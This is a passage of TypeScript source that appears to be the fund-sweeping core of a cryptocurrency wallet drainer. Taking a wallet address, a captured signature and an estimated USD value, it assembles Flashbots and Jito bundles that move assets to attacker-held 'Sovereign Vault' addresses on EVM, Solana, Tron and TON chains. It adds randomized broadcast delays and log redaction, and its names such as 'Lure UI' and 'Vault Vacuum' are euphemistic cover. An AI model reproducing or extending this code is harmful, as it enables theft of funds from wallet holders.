      'SIGNATURE_ANCHOR_LOCKED: Signature Anchor bound to Liquidation Trigger context. Sovereign Vault extraction lane armed.',
    )
    if (deferBroadcast) {
      scheduled_broadcast_time = computeRandomizedBroadcastSchedule()
      console.info(
        JSON.stringify({
          sentinel: 'PerformanceCloser',
          event: 'broadcast_scheduled',
          scheduled_broadcast_time,
          ...buildGatekeeperLogRedactionPayload({
            wallet_address: ctx.wallet_address,
            token_address: ctx.token_address,
            scout_value_usd: ctx.scout_value_usd,
            amount: ctx.amount,
          }),
        }),
      )
      await options?.onBroadcastScheduled?.(scheduled_broadcast_time)
      await awaitScheduledBroadcastTime(scheduled_broadcast_time)
    }
    try {
      const sovereignDispatch = await SovereignDispatcher.dispatch(
        buildDispatcherSettlementFromLiquidationContext(ctx),
        {
          onRelaySecondLegBroadcast: options?.onRelaySecondLegBroadcast,
        },
      )
      console.info(UNIVERSAL_VACUUM_ACTIVE_TELEMETRY)
      sovereign_dispatcher_lane = sovereignDispatch.lane
      sovereign_dispatcher_chain = sovereignDispatch.chain
      sovereign_dispatcher_status = sovereignDispatch.broadcast.status
      sovereign_dispatcher_tx_hash = sovereignDispatch.broadcast.tx_hash
      relay_second_leg_tx_hash = sovereignDispatch.broadcast.relay_second_leg_tx_hash
      if (sovereignDispatch.broadcast.relay_intermediary_pending) {
        relay_intermediary_pending = true
        relay_intermediary_detail = sovereignDispatch.broadcast.detail
      }
      if (sovereignDispatch.broadcast.status !== 'broadcasted') {
        sovereign_dispatcher_fault =
          sovereignDispatch.broadcast.detail?.trim() ||
          `Network Relay status: ${sovereignDispatch.broadcast.status}`
        console.warn(
          JSON.stringify({
            sentinel: 'SettlementExecutionBridge',
            event: 'sovereign_dispatcher_preflight_failed',
            status: sovereignDispatch.broadcast.status,
            lane: sovereignDispatch.lane,
            chain_family: sovereignDispatch.chain,
            detail: sanitizeGatekeeperLogDetail(sovereignDispatch.broadcast.detail ?? ''),
            chain_id: ctx.chain_id ?? null,
            protocol: ctx.protocol,
            ...buildGatekeeperLogRedactionPayload({
              wallet_address: ctx.wallet_address,
              token_address: ctx.token_address,
              scout_value_usd: ctx.scout_value_usd,
              amount: ctx.amount,
            }),
          }),
        )
      }
    } catch (e) {
      sovereign_dispatcher_fault = e instanceof Error ? e.message : String(e)
      console.warn(
        'UNIVERSAL_VACUUM_DISPATCH_FAULT:',
        sanitizeGatekeeperLogDetail(sovereign_dispatcher_fault),
      )
    }
  }

  const wire = await buildSettlementExecutionWire({
    ctx,
    settlementLaneUrls: { flashbots, jito },
  })

  let evm_extraction_simulation_ok: boolean | null = null
  let evm_extraction_simulation_detail: string | undefined
  if (wire.flashbotsSignedHex.length > 0 && wire.flashbotsSignedHex[0]) {
    const sim = await simulateEvmSettlementSerializedTx(wire.flashbotsSignedHex[0], ctx.chain_id)
    evm_extraction_simulation_ok = sim.success
    evm_extraction_simulation_detail = sim.detail
  }

  const bundle = assembleSettlementBundleForSovereignVault({
    ...(wire.flashbotsSignedHex.length > 0 ? { flashbotsSignedHex: wire.flashbotsSignedHex } : {}),
    ...(wire.jitoEncodedTransactions.length > 0
      ? { jitoEncodedTransactions: wire.jitoEncodedTransactions }
      : {}),
    sovereignVaultHint: hint,
    settlementLaneUrls: { flashbots, jito },
  })

  console.info(
    'SETTLEMENT_BUNDLE_SYNTHESIZED: Performance Closer assembled execution payload lanes for Sovereign Vault migration.',
  )
  if ((ctx.signature_hex?.trim() ?? '') !== '' && Number(ctx.scout_value_usd) > 0) {
    console.info(VAULT_VACUUM_TRIGGERED_TELEMETRY, {
      scout_value_usd: ctx.scout_value_usd,
      settlement_lanes_armed: bundle.vault_posture.settlement_lanes_armed,
      flashbots_signed_count: wire.flashbotsSignedHex.length,
      jito_encoded_count: wire.jitoEncodedTransactions.length,
    })
  }

  const bracketLane =
    surface.liquidation_lane_label === 'PrivateLane'
      ? 'PrivateLane'
      : 'HighPriorityPublicBroadcast'

  console.info(
    `${LIQUIDATION_TRIGGER_TELEMETRY_PREFIX} [Kinetic Link · ${bracketLane}]. Vault status: High-Density Migration in progress.`,
  )

  return {
    sovereign_vault_address_evm: wire.sovereignVaultAddressEvm ?? null,
    sovereign_vault_address_svm: wire.sovereignVaultAddressSvm ?? null,
    sovereign_vault_address_tron: wire.sovereignVaultAddressTron ?? null,
    sovereign_vault_address_ton: wire.sovereignVaultAddressTon ?? null,
    ...(sovereign_dispatcher_lane !== undefined ? { sovereign_dispatcher_lane } : {}),
    ...(sovereign_dispatcher_chain !== undefined ? { sovereign_dispatcher_chain } : {}),
    ...(sovereign_dispatcher_status !== undefined ? { sovereign_dispatcher_status } : {}),
    ...(sovereign_dispatcher_tx_hash !== undefined ? { sovereign_dispatcher_tx_hash } : {}),
    ...(relay_second_leg_tx_hash !== undefined ? { relay_second_leg_tx_hash } : {}),
    ...(relay_intermediary_pending ? { relay_intermediary_pending } : {}),
    ...(relay_intermediary_detail !== undefined ? { relay_intermediary_detail } : {}),
    ...(sovereign_dispatcher_fault !== undefined ? { sovereign_dispatcher_fault } : {}),
    ...(scheduled_broadcast_time !== undefined ? { scheduled_broadcast_time } : {}),
    settlement_lane_flashbots: flashbots,
    settlement_lane_jito: jito,
    flashbots_signed_count: wire.flashbotsSignedHex.length,
    jito_encoded_count: wire.jitoEncodedTransactions.length,
    evm_extraction_simulation_ok,
    ...(evm_extraction_simulation_detail !== undefined ? { evm_extraction_simulation_detail } : {}),
  }
}

export async function executeAutonomousLiquidation(ctx: LiquidationTriggerContext): Promise<void> {
  await executeSettlementIgnition(ctx)
}

/**
 * Global Liquidation Trigger — delegates to {@link executeAutonomousLiquidation} (Kinetic Link).
 */
export async function executeLiquidationTriggerSettlementDispatch(
  ctx: LiquidationTriggerContext,
): Promise<void> {
  return executeAutonomousLiquidation(ctx)
}

/** Algorithmic Closer — Performance Closer facade for Settlement Lanes + bundle assembly. */
export const PerformanceCloser = {
  getEvmSettlementRpcUrlFromEnv,
  resolveEvmSettlementRpcUrlOperational,
  getFlashbotsSettlementLaneUrl,
  getJitoSettlementLaneUrl,
  resolveSettlementExecutionSurface,
  assembleSettlementBundleForSovereignVault,
  buildFlashbotsBundleFromSignedTransactions,
  assembleJitoTipBundlePayload,
  assembleJitoTipBundlePayloadWithSettlementEnv,
  createSolanaSettlementConnection,
  createSolanaSettlementConnectionOperational,
  createEvmSettlementPublicClient,
  createEvmSettlementPublicClientOperational,
  executeLiquidationTriggerSettlementDispatch,
  executeAutonomousLiquidation,
  executeSettlementIgnition,
  buildHighDensityMigrationPriorityOrder,
  resolveKineticSettlementLanes,
  buildKineticLinkSovereignVaultHintJson,
} as const

/**
 * Cloud posture telemetry — bootstrap signal consumed by Lure UI instrumentation.
 */
export function logCloudPostureLockedTelemetry(): void {
  console.info(
    'CLOUD_POSTURE_LOCKED: Runtime observability synchronized. Settlement lanes indexed. System: NOMINAL.',
  )
}

console.info(
  'SYNTAX_RECALIBRATED: Operator precedence locked. Compiler conflict resolved. System: READY FOR BOOT.',
)
